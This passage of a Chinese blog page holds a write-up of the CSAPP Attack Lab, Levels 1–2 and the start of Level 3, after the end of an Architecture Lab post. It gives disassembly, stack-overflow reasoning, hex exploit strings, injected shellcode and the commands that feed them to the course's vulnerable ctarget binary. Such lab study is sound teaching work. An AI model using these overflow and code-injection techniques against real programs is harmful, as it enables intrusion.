jg loop</span><br><span class="line">Done:</span><br><span class="line">	ret		</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得分如下，有一些提升</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240319154038991.png" class="" title="image-20240319154038991">
+
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480380496">CSAPP | Lab4-Architecture Lab 深入解析 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/109824219">读书笔记]CSAPP：ArchLab - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42234461/article/details/108720264">【深入理解计算机系统】CSAPP-实验四：ArchLab全网最详细_在sim&#x2F;misc目录中完成以下c代码中三个函数从c语言到y86-64汇编语言的翻译-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://littlecsd.net/2019/01/18/csapp-Archlab/">csapp-Archlab | Little csd’s blog</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/11/CSAPP-Lab3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yiweiBoi">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/11/CSAPP-Lab3/" class="post-title-link" itemprop="url">CSAPP AttackLab</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-11 10:29:55" itemprop="dateCreated datePublished" datetime="2024-03-11T10:29:55+08:00">2024-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-27 14:33:57" itemprop="dateModified" datetime="2024-03-27T14:33:57+08:00">2024-03-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li><p>开始实验前强烈建议读一下官方的说明文档：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf (cmu.edu)</a></p>
+</li>
+<li><p><strong>ctarget</strong>：易受到代码注入攻击的可执行程序</p>
+</li>
+<li><p><strong>rtarget</strong>：易受到面向返回编程攻击的可执行程序</p>
+</li>
+<li><p><strong>cookie.txt</strong>：一个 8 位十六进制代码，您将在攻击中用作唯一标识符</p>
+</li>
+<li><p><strong>fram.c</strong>：目标的 “小工具农场” 的源代码，您将使用它来生成面向返回的编程攻击</p>
+</li>
+<li><p><strong>hex2raw</strong>：用于生成攻击字符串的实用程序</p>
+</li>
+<li><p>CTARGET 和 RTARGET 都从标准输入读取字符串。他们使用下面定义的函数 getbuf 来执行此操作：</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		<span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line"><span class="number">4</span> 		Gets(buf);</span><br><span class="line"><span class="number">5</span> 		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>函数 Gets 类似于标准库函数 gets，它从标准输入读取字符串，并将其存储在指定的目标位置</p>
+<p>函数 Gets 和 gets 都无法确定其目标缓冲区是否足够大来存储它们读取的字符串。它们只是复制字节序列，可能会超出目标分配的存储边界</p>
+</blockquote>
+<ul>
+<li>前三个实验涉及对 CTARGET 的代码注入（CI）攻击，而后两个涉及对 RTARGET 的面向返回编程（ROP）攻击</li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240314104441467.png" class="" title="image-20240314104441467">
+
+<h1 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h1><ul>
+<li>在前三个阶段，您的漏洞利用字符串将攻击 CTARGET</li>
+<li>该程序的设置方式是，堆栈位置在一次运行到下一次运行之间保持一致，因此堆栈上的数据可以被视为可执行代码</li>
+<li>这些功能使程序容易受到攻击，其中漏洞利用字符串包含可执行代码的字节编码</li>
+</ul>
+<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><ul>
+<li><p>对于第 1 阶段，您将不会注入新代码，相反，您的攻击字符串将重定向程序以执行现有过程</p>
+</li>
+<li><p>函数 getbuf 由具有以下 C 代码的函数测试在 CTARGET 中调用</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		<span class="type">int</span> val;</span><br><span class="line"><span class="number">4</span> 		val = getbuf();</span><br><span class="line"><span class="number">5</span> 		<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>getbuf 执行 return 语句时，程序通常会在 test 的第 5 行恢复执行</li>
+<li>我们想改变这种行为，在文件 ctarget 中，有一个函数 touch1 的代码，具有以下 C 表示形式</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">4</span> 		<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line"><span class="number">5</span> 		validate(<span class="number">1</span>);</span><br><span class="line"><span class="number">6</span> 		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">7</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>您的任务是让 CTARGET 在 getbuf 执行其 return 语句时执行 touch1 的代码，而不是返回测试</p>
+</li>
+<li><p>说明文档的一些建议</p>
+<ul>
+<li>通过命令 <strong>objdump -d .&#x2F;ctarget &gt;&gt; ctarget.s</strong> 得到反汇编的 CTARGET 版本</li>
+<li>定位 touch1 起始地址的字节表示，以便 getbuf 代码末尾的 ret 指令将控制权转移到 touch1</li>
+<li>注意字节排序</li>
+</ul>
+</li>
+<li><p>分析 test 的汇编代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp					# %rsp -= 0x8</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;				# 调用 getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx					# %edx = %eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi				# %esi = 0x403188</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp					# %rsp += 0x8</span><br><span class="line">  401990:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>test 调用 getbuf 后，如果成功返回到 test，调用 print_chk 打印字符串：**”No exploit.  Getbuf returned 0x%x\n”** </p>
+</li>
+<li><p>getbuf 执行 return 时将会返回到地址 <strong>0x401976</strong></p>
+</li>
+<li><p>分析 getbuf 的汇编代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp		# %rsp -= 0x28</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi		# %rdi = %rsp</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;	# 调用 Gets</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax		# %eax = 0x1</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp		# %rsp += 0x28</span><br><span class="line">  4017bd:	c3                   	retq   					# return</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>getbuf 的栈帧分配 <strong>0x28（40）</strong> 个字节的空间，调用 Gets 读取字符串从 %rsp 开始向上写入</p>
+</li>
+<li><p>思路分析</p>
+<ul>
+<li>输入超过 40 个字节的字符串，从而造成栈溢出，修改返回地址为 touch1 的起始地址</li>
+</ul>
+</li>
+<li><p>分析 touch1 的汇编代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp				# %rsp -= 0x8</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi			# %edi = 0x4030c5</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;		# 调用 puts</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi				# %edi = 0x1</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;		# 调用 validate</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi				# %edi = 0x0</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;		# 调用 exit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>touch1 的起始地址为 <strong>0x4017c0</strong>，通过 puts 打印字符串：**”Touch1!: You called touch1()”**</li>
+</ul>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li><p>getbuf 的缓冲区大小为 40 字节，前 40 个字节可以随便输入， 后边的值为 touch1 的起始地址 0x4017c0</p>
+</li>
+<li><p>我们通过说明文档推荐的方式解决：创建一个 Level1.txt 文件，写入我们想要输入的值的字节级表示</p>
+<blockquote>
+<p>每个字节的值（两位 16 进制）中间用空格隔开</p>
+<p>注意书写顺序，x86 采用小端法</p>
+<p>Ubuntu 系统下通过命令 touch Level1.txt 创建文件</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// touch1 起始地址</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level1.txt | .&#x2F;ctarget -q</strong> 完成注入<ul>
+<li><strong>hex2raw</strong> 是用于生成攻击字符串的实用程序，将 16 进制的字节级表示转换为攻击字符串</li>
+<li><strong>|</strong> 表示管道，将转换后的攻击字符串作为 ctarget 的参数</li>
+<li><strong>-q</strong> 表示取消连接 CMU 的服务器，连接是默认的，一般我们连接不上 ……</li>
+</ul>
+</li>
+</ul>
+<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240311201249891.png" class="" title="image-20240311201249891">
+
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><ul>
+<li><p>第 2 阶段涉及注入少量代码作为漏洞利用字符串的一部分</p>
+</li>
+<li><p>在文件 ctarget 中，有一个函数 touch2 的代码，具有以下 C 表示形式</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">6</span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">4</span> 		<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="number">5</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> 			validate(<span class="number">2</span>);</span><br><span class="line"><span class="number">7</span> 		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">8</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="number">9</span> 			fail(<span class="number">2</span>);</span><br><span class="line"><span class="number">10</span> 		&#125;</span><br><span class="line"><span class="number">11</span> 			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">12</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>您的任务是让 CTARGET 执行 touch2 的代码，而不是返回测试</p>
+</li>
+<li><p>但是，在这种情况下，您必须使其看起来像 touch2，就好像您已将 cookie 作为其参数传递一样</p>
+<blockquote>
+<p>将 cookie 的值作为 touch2 的参数传递</p>
+</blockquote>
+</li>
+<li><p>说明文档的一些建议</p>
+<ul>
+<li>您需要定位注入代码地址的字节表示，以便 getbuf 代码末尾的 ret 指令将控制权转移给它</li>
+<li>回想一下，函数的第一个参数是在寄存器 %rdi 中传递的</li>
+<li>您注入的代码应将寄存器设置为您的 cookie，然后使用 ret 指令将控制权转移到 touch2 中的第一条指令</li>
+<li>请勿尝试在漏洞利用代码中使用 <strong>jmp 或 call</strong> 指令，这些指令的目标地址的编码很难制定</li>
+<li>请参阅附录 B 中关于如何使用工具生成指令序列的字节级表示的讨论</li>
+</ul>
+</li>
+<li><p>分析 touch2 的汇编代码</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp					# %rsp -= 0x8</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx					# %edx = %edi</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;			# if %edi != cookie，跳转到 401824</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi				# %esi = 0x4030e8</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 打印 &quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi					# %edi = 0x2</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;			# 调用 validate</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;			# 直接跳转到 401842</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi				# %esi = 0x403110</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi= 0x1</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 打印 &quot;Misfire: You called touch2(0x%.8x)\n&quot;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi					# %edi = 0x2</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;				# 调用 fail</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi					# %edi = 0x0</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;			# 调用 exit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>touch2 将传递的参数和 cookie 进行对比，如果传入的参数值等于 cookie，输出 **”Touch2!: You called touch2(0x%.8x)\n”**，否则输出 <strong>“Misfire: You called touch2(0x%.8x)\n”</strong> </p>
+</li>
+<li><p>思考</p>
+<ul>
+<li>任务变得复杂了，仅仅通过栈溢出修改返回地址为 touch2 的起始地址是不行的，还需要将 cookie 作为 touch2 的参数</li>
+<li>可以通过注入代码来实现，在注入代码前，我们要明白怎么才能让程序执行我们注入的代码</li>
+<li>getbuf 执行 return 时会从相邻的上一个栈帧中取出返回地址并执行</li>
+<li>我们可以把指令的字节级表示存储在一个地方，通过栈溢出的方式修改 return 语句的返回地址为存储注入代码的地址，return 执行时就会执行我们注入的代码了</li>
+</ul>
+</li>
+<li><p>思路分析</p>
+<ul>
+<li><p>通过 getbuf 将注入的代码存储在 getbuf 的栈帧中，也就是说此时存储注入代码的地址就是 getbuf 的 %rsp</p>
+</li>
+<li><p>通过栈溢出的方式修改 getbuf 执行return 时的返回地址为 getbuf 的 %rsp</p>
+</li>
+<li><p>注入代码的内容</p>
+<ul>
+<li><p>通过 movq 将 cooike 的值存储在 %rdi 中作为 touch2 的参数，跳转到 touch2 的起始地址</p>
+</li>
+<li><p>对于跳转，通过 pushq 将 touch2 的起始地址入栈，通过 ret 从栈中取出 touch2 的起始地址并执行，即通过 pushq + ret 实现跳转</p>
+<blockquote>
+<p>说明文档提醒我们不要使用 jmp 或 call 等跳转指令</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>我们需要找到 getbuf 栈帧的起始地址 %rsp 的值，通过 gdb 调试工具在 getbuf 的 0x4017ac 处设置断点，查看 %rsp 为 <strong>0x5561dc78</strong></p>
+</li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240312161155532.png" class="" title="image-20240312161155532">
+
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li><p>打开 cookie.txt 文件查看 cookie 的值为 <strong>0x59b997fa</strong></p>
+</li>
+<li><p>创建一个 Level2.s 文件，写入需要注入代码的汇编形式</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi	</span><br><span class="line">pushq 0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>gcc -c Level2.s</strong> 生成二进制文件 Level2.o </li>
+<li>通过命令 <strong>objdump -d Level2.o &gt; Level2.d</strong> 生成文件 Level2.d，即通过反汇编工具生成汇编代码对应的字节级表示</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Level2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建 Level2.txt 文件，写入输入值的字节级表示</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span>	<span class="comment">// 指令的字节级表示</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// getbuf 的 %rsp</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level2.txt | .&#x2F;ctarget -q</strong> 将字节级表示转换为字符串作为参数运行程序</li>
+</ul>
+<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/11/CSAPP-Lab3/image-20240312162217620.png" class="" title="image-20240312162217620">
+
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><ul>
+<li>第 3 阶段还涉及代码注入攻击，但将字符串作为参数传递</li>
+<li>在文件 ctarget 中，有函数 hexmatch 和 touch3 的代码，具有以下 C 表示形式</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="number">2</span> <span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">3 &#123;</span><br><span class="line"><span class="number">4</span> 		<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="number">5</span> 		<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line"><span class="number">6</span> 		<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line"><span class="number">7</span> 		<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="number">8</span> 		<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="number">9</span> &#125;</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> <span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">12 &#123;</span><br><span class="line"><span class="number">13</span> 		vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">14</span> 		<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line"><span class="number">15</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="number">16</span> 			validate(<span class="number">3</span>);</span><br><span class="line"><span class="number">17</span> 		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">18</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="number">19</span> 			fail(<span class="number">3</span>);</span><br><span class="line"><span class="number">20</span> 		&#125;</span><br><span class="line"><span class="number">21</span> 		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">22</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>您的任务是让 CTARGET 执行 touch3 的代码，而不是返回测试</p>
+</li>
+<li><p>您必须让它看起来像 touch3，就好像您已经传递了 cookie 的字符串表示形式作为其参数一样</p>
+<blockquote>
+<p>将 cookie 字符串的字节级表示作为 touch3 的参数传递</p>
+</blockquote>
+</li>
+<li><p>说明文档的一些建议</p>
+<ul>
+<li>您需要在漏洞利用字符串中包含 cookie 的字符串表示形式；字符串应由八个十六进制数字组成（从最高到最低有效排序），不带前导 0x</li>
